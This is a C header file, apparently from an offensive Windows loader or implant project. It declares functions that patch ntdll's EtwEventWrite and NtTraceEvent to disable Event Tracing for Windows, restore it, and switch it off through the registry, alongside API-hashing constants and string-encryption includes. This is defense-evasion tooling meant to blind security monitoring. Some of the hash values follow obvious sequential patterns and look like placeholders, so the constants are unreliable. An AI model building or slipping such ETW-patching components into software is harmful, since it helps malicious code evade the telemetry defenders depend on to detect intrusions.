#pragma once

/*
 * EtwPatch.h - ETW (Event Tracing for Windows) Disabling
 *
 * Provides functionality to disable ETW telemetry by patching
 * ntdll!EtwEventWrite and related functions.
 */

#include <windows.h>
#include "ProcLoader.h"
#include "ApiLoader.h"
#include "StringCrypt.h"

// ETW function hash definitions
#define HASH_FUNC_ETWEVENTWRITE              0x2e5b5e34  // "EtwEventWrite"
#define HASH_FUNC_ETWEVENTWRITEFULL          0x8c1d4e2f  // "EtwEventWriteFull"
#define HASH_FUNC_ETWPROVIDEREVENTWRITE      0x4a3b2c1d  // "EtwProviderEventWrite"
#define HASH_FUNC_NTTRACEEVENT               0x7b2c3d4e  // "NtTraceEvent"

// ETW patch status
typedef struct _ETW_PATCH_STATE {
    BOOL    bIsPatched;
    PVOID   pOriginalEtwEventWrite;
    BYTE    originalBytes[32];
    SIZE_T  patchSize;
} ETW_PATCH_STATE, *PETW_PATCH_STATE;

// Global ETW patch state
extern ETW_PATCH_STATE g_EtwPatchState;

// Function declarations

/**
 * Patch ETW by hooking EtwEventWrite
 * @return TRUE if patch was successful, FALSE otherwise
 */
BOOL PatchETW();

/**
 * Patch ETW using alternative method (NtTraceEvent)
 * @return TRUE if patch was successful, FALSE otherwise
 */
BOOL PatchETWNtTraceEvent();

/**
 * Restore original ETW functionality
 * @return TRUE if restore was successful, FALSE otherwise
 */
BOOL RestoreETW();

/**
 * Check if ETW is currently patched
 * @return TRUE if patched, FALSE otherwise
 */
BOOL IsETWPatched();

/**
 * Get EtwEventWrite function address
 * @return Address of EtwEventWrite or NULL if not found
 */
PVOID GetEtwEventWriteAddr();

/**
 * Disable ETW for current process via registry
 * @return TRUE if successful, FALSE otherwise
 */
BOOL DisableETWRegistry();

/**
 * Enable ETW for current process via registry
 * @return TRUE if successful, FALSE otherwise
 */
BOOL EnableETWRegistry();